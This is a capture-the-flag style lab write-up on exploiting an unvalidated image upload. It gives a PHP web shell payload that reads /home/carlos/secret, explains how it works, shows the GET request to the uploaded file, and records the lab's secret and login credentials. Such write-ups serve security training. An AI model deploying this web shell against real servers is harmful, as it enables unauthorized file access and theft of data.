# Lab: Remote code execution via web shell upload

## LAB DESC

```
This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter


```
## SOLUTION

Basic file upload vuln with 0 checks.  
Just upload malicious `.php` file.

### PAYLOAD:-
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
This payload exploits PHP's built-in file system functions to read the target file directly from the server's disk without invoking a shell or external process.  

`file_get_contents('/home/carlos/secret')`: This function opens the local file /home/carlos/secret directly through the PHP interpreter and reads its entire contents into memory as a string.

`echo`: This command takes the string returned by file_get_contents and writes it directly into the HTTP response body.

we change request header to `GET /files/avatars/malw.php HTTP/2` which returns the secret to us in the response body.
> SECRET : `gGOpv9W7Bo9AH4kXYhyhuOFpzlJQeCjD`


> LAB SOLVED
